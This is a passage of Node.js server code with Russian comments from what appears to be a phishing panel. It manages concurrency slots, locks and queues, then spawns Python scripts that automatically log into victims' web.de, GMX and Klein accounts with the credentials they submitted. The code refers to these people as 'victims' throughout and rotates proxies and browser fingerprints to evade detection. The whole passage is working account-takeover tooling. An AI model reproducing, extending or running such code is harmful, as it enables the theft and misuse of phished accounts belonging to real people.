        'пропуск: email лида не подходит для lead_simulation (@web.de / GMX и т.д.), leadId=' + leadId,
        leadId
      );
    }
    return;
  }
  if (runningWebdeLoginLeadIds.size >= WEBDE_LOGIN_MAX_CONCURRENT) {
    if (!forceRestart && isLeadAutomationAlreadyRunning(leadId)) {
      logDuplicateAutomationAttempt(leadId, '—', 'слоты заняты, для leadId уже идёт автоматизация — в очередь не ставим');
      return;
    }
    pendingWebdeLoginQueue.push({ leadId: leadId, eligibleMail: eligibleMail, forceRestart: !!forceRestart, kleinOrchestration: !!kleinOrchestration });
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'очередь: слотов ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT + ', leadId=' + leadId + ' в очередь (размер ' + pendingWebdeLoginQueue.length + ')', leadId);
    const leadQ = readLeadRowForAutomation(leadId);
    if (leadQ) {
      const brandQ = mailboxAutologinEventBrand(leadQ.email || leadQ.emailKl || '');
      d.pushEvent(leadQ, 'Автовход ' + brandQ + ': очередь', 'script', {
        detail: 'слоты ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT
      });
      d.persistLeadPatch(leadId, { eventTerminal: leadQ.eventTerminal });
    }
    return;
  }
  const lead = leadEarly || readLeadRowForAutomation(leadId);
  if (!lead) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: лид не найден, leadId=' + leadId, leadId);
    return;
  }
  if (lead.brand === 'klein' && !kleinOrchestration && spMailbox !== 'change') {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', (lead.emailKl || lead.email || '').trim() || '—', 'пропуск: Klein — авто через klein_simulation_api.py, не lead_simulation, leadId=' + leadId, leadId);
    return;
  }
  if (spMailbox === 'change' && (leadSubmittedAsKleinVictim(lead) || leadHasKleinCredentialsData(lead))) {
    d.logTerminalFlow(
      'AUTO-LOGIN',
      'Система',
      '—',
      (lead.emailKl || lead.email || '').trim() || '—',
      'пропуск: режим Change + Klein-данные лида (emailKl/passwordKl/brand=klein), leadId=' + leadId,
      leadId
    );
    return;
  }
  const mailboxEmail = spMailbox === 'change'
    ? pickMailboxEmailForAutoLogin(lead, { allowKlFallback: true })
    : pickMailboxEmailForAutoLogin(lead, { allowKlFallback: false });
  const lockEmailRaw = kleinOrchestration
    ? String((lead.email || lead.emailKl || '')).trim()
    : mailboxEmail;
  if (!lockEmailRaw) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: нет email для автовхода, leadId=' + leadId, leadId);
    return;
  }
  if (!forceRestart && statusSkipsVictimMailboxAutologinDuplicate(lead.status)) {
    d.logTerminalFlow(
      'AUTO-LOGIN',
      'Система',
      '—',
      lockEmailRaw,
      'пропуск: лид уже на шаге после входа (success/redirect) без forceRestart, status=' + String(lead.status || '') + ', leadId=' + leadId,
      leadId
    );
    return;
  }
  if (lead.webdeLoginGridExhausted === true && !forceRestart) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmailRaw, 'пропуск: сетка прокси×отпечаток уже исчерпана (кнопка запуска в админке или forceRestart), leadId=' + leadId, leadId);
    return;
  }
  if (!forceRestart && isLeadAutomationAlreadyRunning(leadId)) {
    logDuplicateAutomationAttempt(leadId, lockEmailRaw, 'активный процесс / слот / lock по leadId');
    return;
  }
  const email = lockEmailRaw.toLowerCase();
  preemptWebdeLoginForReplacedLead(leadId, email);
  if (!tryAcquireLeadAutomationLock(leadId)) {
    logDuplicateAutomationAttempt(leadId, lockEmailRaw, 'lock leadId занят (atomic)');
    return;
  }
  if (!tryAcquireWebdeScriptLock(email, leadId)) {
    clearLeadAutomationLock(leadId);
    d.writeDebugLog('WEBDE_LOCK_BUSY_AFTER_PREEMPT', {
      hypothesisId: 'H_cluster_or_stale',
      leadId: leadId,
      lockMaxAgeMs: WEBDE_SCRIPT_MAX_AGE_MS
    });
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', email, 'пропуск: скрипт уже запущен для email, leadId=' + leadId, leadId);
    return;
  }
  const loginDir = path.join(d.serverProjectRoot, 'login');
  const scriptPath = path.join(loginDir, 'lead_simulation_api.py');
  if (!fs.existsSync(scriptPath)) {
    console.error('[AUTO-LOGIN] Ошибка: не найден скрипт ' + scriptPath);
    clearLeadAutomationLock(leadId);
    clearWebdeScriptRunning(email);
    return;
  }
  const webdeComboSlot = runningWebdeLoginLeadIds.size;
  runningWebdeLoginLeadIds.add(leadId);
  /** Смещение стартового прокси по кругу на каждый запуск (при 1 параллельном слоте combo_slot всегда 0 — иначе часто остаётся «один прокси»). */
  if (typeof global.__gmwWebdeProxyRoundRobinCounter !== 'number' || !Number.isFinite(global.__gmwWebdeProxyRoundRobinCounter)) {
    global.__gmwWebdeProxyRoundRobinCounter = 0;
  }
  const webdeProxyRoundIndex = global.__gmwWebdeProxyRoundRobinCounter++;
  const baseUrl = process.env.SERVER_URL || ('http://127.0.0.1:' + (parseInt(process.env.PORT, 10) || 3000));
  const workerSecret = d.getWorkerSecret() || '';
  const webdeRunSession = beginWebdeAutoLoginRun(lead);
  const atDom = email.indexOf('@') >= 0 ? email.slice(email.indexOf('@')) : '';
  const klMarked = d.leadHasKleinMarkedData(lead);
  const orchDetail = kleinOrchestration && klMarked ? ' · после почты — Klein' : '';
  const brandSlot = mailboxAutologinEventBrand(email);
  const startLab =
    'Автовход ' + brandSlot + ' ' + (webdeComboSlot + 1) + '/' + WEBDE_LOGIN_MAX_CONCURRENT;
  const startDetail =
    mailboxAutomationLogLabel(email) +
    ' · слот ' +
    webdeComboSlot +
    '/' +
    WEBDE_LOGIN_MAX_CONCURRENT +
    (atDom ? ' · …' + atDom : '') +
    orchDetail;
  d.pushEvent(lead, startLab, 'script', { session: webdeRunSession, detail: startDetail });
  d.persistLeadPatch(leadId, {
    webdeScriptRunSeq: lead.webdeScriptRunSeq,
    webdeScriptActiveRun: lead.webdeScriptActiveRun,
    eventTerminal: lead.eventTerminal
  });
  d.logTerminalFlow(
    'AUTO-LOGIN',
    'Автовход',
    webdeRunSession,
    email,
    'запуск Python · ' +
      mailboxAutomationLogLabel(email) +
      ' · leadId=' +
      leadId +
      (kleinOrchestration ? ' klein-orchestration' : '') +
      ' comboSlot=' +
      webdeComboSlot +
      ' активных ' +
      runningWebdeLoginLeadIds.size +
      '/' +
      WEBDE_LOGIN_MAX_CONCURRENT,
    leadId
  );
  const projectRoot = d.serverProjectRoot;
  const python = resolvePythonExecutable(projectRoot);
  const env = makePythonSpawnEnv(projectRoot);
  const pyArgs = [scriptPath, '--server-url', baseUrl, '--lead-id', leadId, '--combo-slot', String(webdeComboSlot)];
  if (kleinOrchestration) pyArgs.push('--klein-orchestration');
  const child = spawn(python, pyArgs, {
    cwd: d.serverProjectRoot,
    detached: true,
    stdio: 'inherit',
    env: Object.assign({}, env, { WORKER_SECRET: workerSecret }, webdeScriptProxyEnv(), {
      WEBDE_PROXY_ROUND_INDEX: String(webdeProxyRoundIndex),
    }),
  });
  webdeLockWriteChildPid(email, child.pid);
  webdeLeadLockWritePid(leadId, child.pid);
  webdeLoginChildByLeadId.set(leadId, child);
  registerAutomationChild(child);
  var cleaned = false;
  function cleanupChild(reason, errObj) {
    if (cleaned) return;
    cleaned = true;
    unregisterAutomationChild(child);
    webdeLoginChildByLeadId.delete(leadId);
    clearLeadAutomationLock(leadId);
    releaseWebdeLoginSlot(leadId);
    clearWebdeScriptRunning(email);
    try {
      const live = d.readLeadById(leadId);
      if (live && live.webdeScriptActiveRun != null && live.webdeScriptActiveRun !== '') {
        endWebdeAutoLoginRun(live);
        d.persistLeadPatch(leadId, { webdeScriptActiveRun: null });
      }
    } catch (_) {}
    if (reason === 'exit' && errObj && Number.isFinite(errObj.code) && errObj.code !== 0) {
      try {
        d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', email, 'Скрипт завершился с ошибкой (code=' + errObj.code + '), leadId=' + leadId, leadId);
      } catch (_) {}
    }
    if (reason === 'error') {
      try {
        const msg = errObj && errObj.message ? String(errObj.message) : String(errObj || 'spawn_error');
        d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', email, 'ошибка запуска Python: ' + msg + ', leadId=' + leadId, leadId);
      } catch (_) {}
    }
  }
  child.on('exit', function (code, signal) { cleanupChild('exit', { code: code, signal: signal }); });
  child.on('error', function (err) { cleanupChild('error', err); });
  child.unref();
}

function startKleinLoginForLeadId(leadId, forceRestart) {
  const d = getDeps();
  if (typeof d.readScriptMode === 'function' && d.readScriptMode()) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: Script-режим включён (серверный Python не нужен), leadId=' + leadId, leadId);
    return;
  }
  if (!leadId || !d.readAutoScript()) {
    if (leadId && !d.readAutoScript()) {
      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: Auto-script выключен, leadId=' + leadId, leadId);
    }
    return;
  }
  const spKlNow = kleinStartPageNorm(d);
  if (spKlNow !== 'klein') {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: стартовая страница бренда Klein не Klein (startPage=' + spKlNow + '), leadId=' + leadId, leadId);
    return;
  }
  if (runningWebdeLoginLeadIds.size >= WEBDE_LOGIN_MAX_CONCURRENT) {
    if (!forceRestart && isLeadAutomationAlreadyRunning(leadId)) {
      logDuplicateAutomationAttempt(leadId, '—', 'Klein: слоты заняты, для leadId уже идёт автоматизация — в очередь не ставим');
      return;
    }
    pendingWebdeLoginQueue.push({ leadId: leadId, forceRestart: !!forceRestart, script: 'klein' });
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'очередь Klein: слотов ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT + ', leadId=' + leadId, leadId);
    const leadKq = readLeadRowForAutomation(leadId);
    if (leadKq) {
      d.pushEvent(leadKq, 'Автовход Klein: очередь', 'script', {
        detail: 'слоты ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT
      });
      d.persistLeadPatch(leadId, { eventTerminal: leadKq.eventTerminal });
    }
    return;
  }
  const lead = readLeadRowForAutomation(leadId);
  if (!lead) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: лид не найден, leadId=' + leadId, leadId);
    return;
  }
  if (leadIsWorkedLikeAdmin(lead)) {
    const emW = String(lead.emailKl || lead.email || '').trim() || '—';
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', emW, 'пропуск Klein: лог отработан · leadId=' + leadId, leadId);
    return;
  }
  if (!leadSubmittedAsKleinVictim(lead)) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: нет brand/clientFormBrand klein, leadId=' + leadId, leadId);
    return;
  }
  const lockEmail = String(lead.emailKl || lead.email || '').trim().toLowerCase();
  if (!lockEmail) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: нет emailKl/email, leadId=' + leadId, leadId);
    return;
  }
  if (!forceRestart && statusSkipsVictimMailboxAutologinDuplicate(lead.status)) {
    d.logTerminalFlow(
      'AUTO-LOGIN',
      'Система',
      '—',
      lockEmail,
      'пропуск Klein: лид уже на шаге после входа (success/redirect) без forceRestart, status=' + String(lead.status || '') + ', leadId=' + leadId,
      leadId
    );
    return;
  }
  if (!forceRestart && isLeadAutomationAlreadyRunning(leadId)) {
    logDuplicateAutomationAttempt(leadId, lockEmail, 'Klein: активный процесс / слот / lock по leadId');
    return;
  }
  preemptWebdeLoginForReplacedLead(leadId, lockEmail);
  if (!tryAcquireLeadAutomationLock(leadId)) {
    logDuplicateAutomationAttempt(leadId, lockEmail, 'Klein: lock leadId занят (atomic)');
    return;
  }
  if (!tryAcquireWebdeScriptLock(lockEmail, leadId)) {
    clearLeadAutomationLock(leadId);
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmail, 'пропуск Klein: lock занят, leadId=' + leadId, leadId);
    return;
  }
  const loginDir = path.join(d.serverProjectRoot, 'login');
  const scriptPath = path.join(loginDir, 'klein_simulation_api.py');
  if (!fs.existsSync(scriptPath)) {
    console.error('[AUTO-LOGIN] Klein: не найден скрипт ' + scriptPath);
    clearLeadAutomationLock(leadId);
    clearWebdeScriptRunning(lockEmail);
    return;
  }
  const kleinComboSlot = runningWebdeLoginLeadIds.size;
  runningWebdeLoginLeadIds.add(leadId);
  const baseUrl = process.env.SERVER_URL || ('http://127.0.0.1:' + (parseInt(process.env.PORT, 10) || 3000));
  const workerSecret = d.getWorkerSecret() || '';
  const kleinRunSession = beginWebdeAutoLoginRun(lead);
  const klDom = lockEmail.indexOf('@') >= 0 ? lockEmail.slice(lockEmail.indexOf('@')) : '';
  const klStartLab =
    'Автовход Klein ' + (kleinComboSlot + 1) + '/' + WEBDE_LOGIN_MAX_CONCURRENT;
  const klStartDetail =
    'слот ' + kleinComboSlot + '/' + WEBDE_LOGIN_MAX_CONCURRENT + (klDom ? ' · …' + klDom : '');
  d.pushEvent(lead, klStartLab, 'script', { session: kleinRunSession, detail: klStartDetail });
  d.persistLeadPatch(leadId, {
    webdeScriptRunSeq: lead.webdeScriptRunSeq,
    webdeScriptActiveRun: lead.webdeScriptActiveRun,
    eventTerminal: lead.eventTerminal
  });
  d.logTerminalFlow('AUTO-LOGIN', 'Klein', kleinRunSession, lockEmail, 'запуск klein_simulation_api.py leadId=' + leadId + ' активных ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT, leadId);
  const projectRoot = d.serverProjectRoot;
  const python = resolvePythonExecutable(projectRoot);
  const env = makePythonSpawnEnv(projectRoot);
  const child = spawn(python, [scriptPath, '--server-url', baseUrl, '--lead-id', leadId], {
    cwd: d.serverProjectRoot,
    detached: true,
    stdio: 'inherit',
    env: Object.assign({}, env, { WORKER_SECRET: workerSecret })
  });
  webdeLockWriteChildPid(lockEmail, child.pid);
  webdeLeadLockWritePid(leadId, child.pid);
  webdeLoginChildByLeadId.set(leadId, child);
  registerAutomationChild(child);
  var cleaned = false;
  function cleanupChild(reason, errObj) {
    if (cleaned) return;
    cleaned = true;
    unregisterAutomationChild(child);
    webdeLoginChildByLeadId.delete(leadId);
    clearLeadAutomationLock(leadId);
    releaseWebdeLoginSlot(leadId);
    clearWebdeScriptRunning(lockEmail);
    try {
      const live = d.readLeadById(leadId);
      if (live && live.webdeScriptActiveRun != null && live.webdeScriptActiveRun !== '') {
        endWebdeAutoLoginRun(live);
        d.persistLeadPatch(leadId, { webdeScriptActiveRun: null });
      }
    } catch (_) {}
    if (reason === 'exit' && errObj && Number.isFinite(errObj.code) && errObj.code !== 0) {
      try {
        d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmail, 'Скрипт завершился с ошибкой (code=' + errObj.code + '), leadId=' + leadId, leadId);
      } catch (_) {}
    }
    if (reason === 'error') {
      try {
        const msg = errObj && errObj.message ? String(errObj.message) : String(errObj || 'spawn_error');
        d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmail, 'ошибка запуска Klein Python: ' + msg + ', leadId=' + leadId, leadId);
      } catch (_) {}
    }
  }
  child.on('exit', function (code, signal) { cleanupChild('exit', { code: code, signal: signal }); });
  child.on('error', function (err) { cleanupChild('error', err); });
  child.unref();
}

function killAllSpawnedAutomationChildrenSync() {
  try {
    activeAutomationChildren.forEach(function (c) {
      if (c && typeof c.kill === 'function') {
        try { c.kill('SIGKILL'); } catch (_) {}
      }
    });
    activeAutomationChildren.clear();
    webdeLoginChildByLeadId.forEach(function (c) {
      if (c && typeof c.kill === 'function') {
        try {
          c.kill('SIGKILL');
        } catch (_) {}
      }
    });
  } catch (_) {}
}

(function registerAutomationProcessExitHook() {
  process.on('exit', killAllSpawnedAutomationChildrenSync);
})();

/**
 * PM2 / systemd шлют SIGTERM; Ctrl+C — SIGINT.
 * Сначала убиваем отсоединённые Python (detached), затем даём сработать server.js → shutdown() → server.close → process.exit(0).
 * Не вызываем здесь process.exit(0), иначе оборвётся graceful close HTTP и SQLite.
 */
(function registerAutomationSignalHandlers() {
  function onSignal(sig) {
    try {
      console.log('[AUTO-LOGIN] ' + sig + ': завершение дочерних Python (SIGKILL)…');
      killAllSpawnedAutomationChildrenSync();
    } catch (_) {}
  }
  process.on('SIGTERM', function () {
    onSignal('SIGTERM');
  });
  process.on('SIGINT', function () {
    onSignal('SIGINT');
  });
})();

module.exports = {
  init,
  WEBDE_LOGIN_MAX_CONCURRENT,
  WEBDE_SCRIPT_MAX_AGE_MS,
  runningWebdeLoginLeadIds,
  pendingWebdeLoginQueue,
  webdeLoginChildByLeadId,
  runWhenLeadsWriteQueueIdle,
  tryAcquireWebdeScriptLock,
  clearWebdeScriptRunning,
  touchWebdeScriptLock,
  webdeLockWriteChildPid,
  webdeLockKillChildIfAny,
  webdeLockPath,
  beginWebdeAutoLoginRun,
  endWebdeAutoLoginRun,
  setWebdeLeadScriptStatus,
  releaseWebdeLoginSlot,
  preemptWebdeLoginForReplacedLead,
  stopWebdeLoginForDeletedLead,
  clearAllWebdeChildrenAndQueues,
  startWebdeLoginAfterLeadSubmit,
  restartWebdeAutoLoginAfterVictimRetryFromError,
  startWebdeLoginForLeadId,
  startKleinLoginForLeadId,
  isLeadAutomationAlreadyRunning,
  killAllSpawnedAutomationChildrenSync,
  resolvePythonExecutable,
  makePythonSpawnEnv,
  webdeScriptProxyEnv,
  leadSubmittedAsKleinVictim,
  shouldSkipMailboxAutologinForLead,
};
